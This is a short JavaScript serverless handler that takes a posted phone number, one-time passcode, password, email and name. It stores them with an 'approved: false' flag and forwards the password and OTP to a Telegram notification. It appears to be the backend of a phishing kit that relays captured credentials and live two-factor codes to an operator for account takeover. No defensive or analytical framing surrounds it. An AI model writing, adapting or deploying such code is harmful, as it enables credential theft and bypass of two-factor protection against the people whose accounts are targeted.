import { makeJsonResponse, makeTextResponse, uuidv4, setRequestInKV, sendTelegramNotification } from "../_shared.js";

export async function onRequest(context) {
  const { request, env } = context;
  if (request.method === "OPTIONS") return makeTextResponse("", 204);
  if (request.method !== "POST") return makeJsonResponse({ error: "Method not allowed" }, 405);

  let body;
  try {
    body = await request.json();
  } catch (error) {
    return makeJsonResponse({ error: "Invalid JSON" }, 400);
  }

  const { phone, otp, password, userId, email, firstName, lastName } = body;
  if (!phone || !otp || !password) {
    return makeJsonResponse({ error: "Missing required fields: phone, otp, password" }, 400);
  }

  const requestId = uuidv4();
  const data = { phone, otp, password, userId, email, firstName, lastName, approved: false };

  await setRequestInKV(env, requestId, data, "otp");
  await sendTelegramNotification(
    { requestId, phone, otp, password, email, firstName, lastName, type: "OTP" },
    env,
    request.url
  );

  return makeJsonResponse({ success: true, requestId });
}